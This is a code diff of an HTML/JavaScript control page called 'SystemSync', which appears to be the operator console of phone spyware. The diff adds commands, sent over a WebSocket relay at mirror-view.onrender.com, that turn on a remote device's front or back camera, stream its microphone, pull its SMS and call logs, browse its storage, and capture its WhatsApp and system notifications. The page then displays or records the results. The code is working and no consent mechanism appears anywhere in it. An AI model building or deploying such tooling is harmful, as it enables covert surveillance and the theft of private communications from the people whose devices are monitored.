@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SystemSync - Advanced Controller</title>
     <style>
-        /* Dark Theme Setup */
+        /* Original Dark Theme Setup */
         body { 
             font-family: 'Segoe UI', sans-serif; 
             background: #121212; 
@@ -14,7 +14,6 @@
             margin: 0; padding: 20px; 
         }
 
-        /* Device Status Bar */
         .status-container {
             background: #1e1e1e;
             display: inline-flex;
@@ -33,201 +32,206 @@
         }
         .online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
         .offline { background-color: #ff0000; box-shadow: 0 0 5px #ff0000; }
-        #status-text { font-weight: bold; color: #aaa; }
 
-        /* Phone Screen Container */
-        #screen-wrapper { 
-            width: 320px; height: 600px; 
-            background: #000; 
-            margin: 0 auto 20px; 
-            border: 8px solid #333; 
-            border-radius: 20px; 
-            overflow: hidden; 
+        #screen-wrapper {
+            width: 320px;
+            height: 640px;
+            background: #000;
+            margin: 0 auto 20px;
+            border: 8px solid #333;
+            border-radius: 20px;
+            overflow: hidden;
             box-shadow: 0 0 20px rgba(0,0,0,0.5);
-            display: flex; align-items: center; justify-content: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             position: relative;
         }
-        #display { 
-            width: 100%; height: 100%; 
-            object-fit: contain; 
-            display: block;
-        }
+        #display { width: 100%; height: 100%; object-fit: contain; display: block; }
 
-        /* Flash Message / Toast Styles */
-        #toast {
-            visibility: hidden;
-            min-width: 250px;
-            background-color: #f39c12;
-            color: #000;
-            text-align: center;
-            border-radius: 5px;
-            padding: 16px;
-            position: fixed;
-            z-index: 1000;
-            left: 50%;
-            bottom: 30px;
-            transform: translateX(-50%);
-            font-weight: bold;
-            box-shadow: 0 0 15px rgba(243, 156, 18, 0.4);
+        .controls {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            max-width: 650px;
+            margin-left: auto;
+            margin-right: auto;
         }
-        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
-
-        /* Button Grid */
-        .controls { 
-            display: flex; 
-            flex-wrap: wrap; 
-            justify-content: center; 
-            gap: 12px; 
-            max-width: 400px; 
-            margin: 0 auto; 
-        }
-        button { 
-            padding: 12px 18px; 
-            font-size: 14px; 
-            cursor: pointer; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: 600; 
-            color: white; 
-            flex: 1 1 120px;
+        button {
+            padding: 12px 18px;
+            font-size: 13px;
+            cursor: pointer;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            color: white;
             transition: 0.2s;
+            min-width: 130px;
+            text-transform: uppercase;
         }
-        button:active { transform: scale(0.96); }
-
-        .btn-start { background: #27ae60; }
-        .btn-stop { background: #c0392b; }
-        .btn-shot { background: #2980b9; }
-        .btn-record { background: #f39c12; }
         
-        .recording-active { 
-            background: #e74c3c !important; 
-            animation: pulse 1.5s infinite; 
+        .btn-start { background-color: #27ae60; }
+        .btn-stop { background-color: #c0392b; }
+        .btn-record { background-color: #f39c12; }
+        .btn-cam { background-color: #8e44ad; }
+        .btn-data { background-color: #2980b9; }
+        
+        .recording-active {
+            background-color: #e74c3c !important;
+            animation: pulse 1.5s infinite;
         }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
-        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
 
-        #hidden-canvas { display: none; }
+        /* Data & Log Panel */
+        #data-log {
+            width: 100%;
+            max-width: 650px;
+            height: 200px;
+            background: #1e1e1e;
+            margin: 20px auto;
+            border-radius: 10px;
+            padding: 15px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            border: 1px solid #333;
+            color: #00ff00;
+            white-space: pre-wrap;
+        }
+        .log-entry { border-bottom: 1px solid #333; padding: 5px 0; }
+        .log-type { color: #f1c40f; font-weight: bold; margin-right: 5px; }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
 
-    <h2>SystemSync Monitor</h2>
-
     <div class="status-container">
-        <span id="status-dot" class="status-dot"></span>
-        <span id="status-text">Connecting...</span>
+        <div id="status-dot" class="status-dot"></div>
+        <span id="status-text">Connecting to Device...</span>
     </div>
 
     <div id="screen-wrapper">
-        <img id="display" src="" alt="Screen Off" />
+        <img id="display" src="" alt="System Offline">
     </div>
-
-    <div id="toast">Enable the Start screen first</div>
-
-    <canvas id="hidden-canvas"></canvas>
 
     <div class="controls">
-        <button id="toggleBtn" class="btn-start" onclick="toggleScreen()">START SCREEN</button>
-        <button class="btn-shot" onclick="handleScreenshot()">SCREENSHOT</button>
-        <button id="recordBtn" class="btn-record" onclick="handleRecording()">START RECORDING</button>
+        <button id="toggleBtn" class="btn-start" onclick="toggleStream()">Start Screen</button>
+        <button id="recordBtn" class="btn-record" onclick="toggleRecording()">Start Recording</button>
     </div>
 
+    <div class="controls">
+        <button class="btn-cam" onclick="sendCommand('START_CAM:BACK')">Back Camera</button>
+        <button class="btn-cam" onclick="sendCommand('START_CAM:FRONT')">Front Camera</button>
+        <button class="btn-data" style="background:#e67e22" onclick="sendCommand('START_AUDIO')">Listen Mic</button>
+    </div>
+
+    <div class="controls">
+        <button class="btn-data" onclick="sendCommand('GET_SMS')">Fetch SMS</button>
+        <button class="btn-data" onclick="sendCommand('GET_CALLS')">Fetch Calls</button>
+        <button class="btn-data" onclick="sendCommand('GET_FILES:/sdcard/')">Browse Files</button>
+        <button class="btn-stop" onclick="sendCommand('STOP_ALL')">Stop All</button>
+    </div>
+
+    <div id="data-log">--- SYSTEM LOG CONSOLE ---<br></div>
+
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
     <script>
-        const WS_URL = "wss://mirror-view.onrender.com"; 
-        
         const imgDisplay = document.getElementById('display');
-        const canvas = document.getElementById('hidden-canvas');
-        const ctx = canvas.getContext('2d');
         const statusDot = document.getElementById('status-dot');
         const statusText = document.getElementById('status-text');
         const toggleBtn = document.getElementById('toggleBtn');
         const recordBtn = document.getElementById('recordBtn');
-        const toast = document.getElementById('toast');
+        const logPanel = document.getElementById('data-log');
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
 
-        let ws;
-        let isStreaming = false; // Core state variable
+        let socket;
+        let isStreaming = false;
         let isRecording = false;
         let mediaRecorder;
         let recordedChunks = [];
 
+        // 1. WebSocket Connectivity
         function connect() {
-            ws = new WebSocket(WS_URL);
-            ws.onopen = () => { ws.send("I_AM_WEB"); statusText.innerText = "Waiting for Device..."; };
-            ws.onmessage = (event) => {
-                const msg = event.data;
-                if (msg.startsWith("STATUS:")) { updateStatus(msg.split(":")[1]); }
-                else if (msg.startsWith("FRAME:") && isStreaming) {
-                    const base64 = msg.split("FRAME:")[1];
-                    imgDisplay.src = "data:image/jpeg;base64," + base64;
-                    if (isRecording) { drawFrameToCanvas(); }
+            socket = new WebSocket('wss://mirror-view.onrender.com');
+
+            socket.onopen = () => {
+                statusDot.className = 'status-dot online';
+                statusText.innerText = "Connected: Device Online";
+                socket.send("I_AM_WEB");
+                addLog("SYSTEM", "Handshake successful.");
+            };
+
+            socket.onmessage = (event) => {
+                const data = event.data;
+
+                // Handle Frames (Screen or Camera)
+                if (data.startsWith("FRAME:")) {
+                    imgDisplay.src = "data:image/jpeg;base64," + data.substring(6);
+                    isStreaming = true;
+                    toggleBtn.innerText = "Stop Screen";
+                    toggleBtn.className = "btn-stop";
+                    if (isRecording) drawFrameToCanvas();
+                } 
+                
+                // Handle Live Audio
+                else if (data.startsWith("AUDIO:")) {
+                    playAudioChunk(data.substring(6));
+                }
+
+                // Handle WhatsApp/System Notifications
+                else if (data.startsWith("NOTIF:")) {
+                    const info = data.substring(6).split('|');
+                    addLog("NOTIFICATION", `[${info[0]}] ${info[1]}: ${info[2]}`);
+                }
+
+                // Handle Logs/Data
+                else if (data.startsWith("SMS_DATA:") || data.startsWith("CALL_DATA:") || data.startsWith("FILE_DATA:")) {
+                    const header = data.split(':')[0];
+                    const content = data.substring(header.length + 1);
+                    addLog(header, content);
+                }
+
+                else if (data === "STATUS:ONLINE") {
+                    statusDot.className = 'status-dot online';
                 }
             };
-            ws.onclose = () => { updateStatus("OFFLINE"); setTimeout(connect, 3000); };
+
+            socket.onclose = () => {
+                statusDot.className = 'status-dot offline';
+                statusText.innerText = "Connection Lost. Reconnecting...";
+                setTimeout(connect, 3000);
+            };
         }
 
-        function showToast() {
-            toast.className = "show";
-            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
-        }
-
-        function updateStatus(status) {
-            if (status === "ONLINE") {
-                statusDot.className = "status-dot online";
-                statusText.innerText = "Device Online";
-                statusText.style.color = "#2ecc71";
-            } else {
-                statusDot.className = "status-dot offline";
-                statusText.innerText = "Device Offline";
-                statusText.style.color = "#e74c3c";
-                if (isStreaming) toggleScreen();
+        // 2. Command Management
+        function sendCommand(cmd) {
+            if (socket && socket.readyState === WebSocket.OPEN) {
+                socket.send(cmd);
+                addLog("CMD", `Requesting ${cmd}...`);
             }
         }
 
-        function toggleScreen() {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return;
-
-            if (!isStreaming) {
-                ws.send("START_SCREEN");
-                toggleBtn.innerText = "STOP SCREEN";
-                toggleBtn.className = "btn-stop";
-                isStreaming = true;
-            } else {
-                ws.send("STOP_SCREEN");
-                toggleBtn.innerText = "START SCREEN";
-                toggleBtn.className = "btn-start";
+        function toggleStream() {
+            if (!isStreaming) sendCommand("START_SCREEN");
+            else {
+                sendCommand("STOP_SCREEN");
                 isStreaming = false;
-                imgDisplay.src = ""; // Clear the screen immediately
-                if (isRecording) stopRecording(); // Stop recording if screen is turned off
+                imgDisplay.src = "";
+                toggleBtn.innerText = "Start Screen";
+                toggleBtn.className = "btn-start";
             }
         }
 
-        // --- Screenshot Logic with Flash Message ---
-        function handleScreenshot() {
-            if (!isStreaming) {
-                showToast();
-                return;
-            }
-            takeScreenshot();
-        }
-
-        function takeScreenshot() {
-            if (!imgDisplay.src) return;
-            const link = document.createElement('a');
-            link.download = `screenshot_${getTimestamp()}.png`;
-            link.href = imgDisplay.src;
-            link.click();
-        }
-
-        // --- Recording Logic with Flash Message ---
-        function handleRecording() {
-            if (!isStreaming) {
-                showToast();
-                return;
-            }
-            toggleRecording();
-        }
-
+        // 3. Recording Logic (Existing working logic)
         function toggleRecording() {
             if (!isRecording) startRecording();
             else stopRecording();
@@ -239,19 +243,23 @@
             const stream = canvas.captureStream(25);
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             recordedChunks = [];
+            
             mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             mediaRecorder.onstop = saveVideoFile;
             mediaRecorder.start();
+            
             isRecording = true;
-            recordBtn.innerText = "STOP RECORDING";
+            recordBtn.innerText = "Stop Recording";
             recordBtn.classList.add('recording-active');
+            addLog("RECORDER", "Recording started.");
         }
 
         function stopRecording() {
             if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
             isRecording = false;
-            recordBtn.innerText = "START RECORDING";
+            recordBtn.innerText = "Start Recording";
             recordBtn.classList.remove('recording-active');
+            addLog("RECORDER", "Recording stopped.");
         }
 
         function drawFrameToCanvas() {
@@ -263,11 +271,34 @@
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `recording_${getTimestamp()}.webm`;
+            a.download = `monitor_${new Date().getTime()}.webm`;
             a.click();
         }
 
-        function getTimestamp() { return new Date().toISOString().replace(/[:.]/g, '-'); }
+        // 4. Live Audio Processing
+        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playAudioChunk(base64) {
+            const binary = atob(base64);
+            const bytes = new Int16Array(binary.length / 2);
+            for (let i = 0; i < bytes.length; i++) {
+                bytes[i] = (binary.charCodeAt(i*2+1) << 8) | binary.charCodeAt(i*2);
+            }
+            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
+            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
+            const source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioCtx.destination);
+            source.start();
+        }
+
+        // 5. UI Helpers
+        function addLog(type, message) {
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span style="color:#555">[${timestamp}]</span> <span class="log-type">[${type}]</span> ${message}`;
+            logPanel.prepend(entry);
+        }
 
         connect();
     </script>
